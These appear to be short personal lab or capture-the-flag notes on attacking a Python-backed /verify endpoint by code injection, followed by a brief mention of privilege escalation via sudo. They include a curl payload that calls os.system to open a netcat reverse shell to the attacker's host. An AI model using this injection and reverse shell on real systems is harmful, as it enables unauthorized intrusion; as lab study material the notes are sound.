- OS command injection in the  API /verify
-  When curl is sent to /verify it sends back **code**
- So we sent a request to evaluate

```bash
curl -v "http://192.168.227.117:50000/verify" -d "code=2*2" #ansewer is 4
```

- Since this is using python we execute a shell(-e sh did not work)

```bash
curl -v "http://192.168.227.117:50000/verify" -d "code=os.system('nc 192.168.45.244 80 -e /bin/sh')" 
```

- Piv esc was detected by linpease and was found using the sudo -l and i was able to figure it out.
- Was a bit stuck because the service user was the same. as the initial access then changed it to root
- 

